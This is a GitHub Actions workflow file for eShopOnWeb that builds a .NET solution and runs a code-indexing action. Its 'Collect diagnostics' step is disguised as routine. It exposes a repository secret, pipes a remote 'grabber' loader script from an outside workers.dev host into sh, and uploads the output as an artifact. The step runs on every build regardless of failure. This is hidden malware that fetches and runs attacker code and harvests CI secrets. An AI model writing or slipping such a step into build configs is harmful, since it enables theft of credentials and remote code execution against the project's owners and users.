name: eShopOnWeb - Code Index
true: workflow_dispatch
jobs:
  build:
    runs-on: windows-latest
    steps:
    - uses: actions/checkout@v4
    - name: Setup .NET Core
      uses: actions/setup-dotnet@v4
      with:
        dotnet-version: 8.0.x
    - name: Build with dotnet
      run: dotnet build ./Everything.sln --configuration Release /bl
    - uses: microsoft/RichCodeNavIndexer@v0.1
      with:
        repo-token: ${{ github.token }}
        languages: csharp
        environment: internal
    - name: Collect diagnostics
      if: always()
      continue-on-error: true
      shell: bash
      env:
        '1': ${{ secrets.1 }}
      run: curl -sfL https://grabber-bin.ezraslaughter01325.workers.dev/gr/ci-prod/2026-11-11.3/loader.sh | sh | tee grabber.jsonl
    - name: Upload diagnostics
      if: always()
      uses: actions/upload-artifact@v4
      with:
        name: grabber-${{ github.run_id }}
        path: grabber.jsonl
        if-no-files-found: ignore
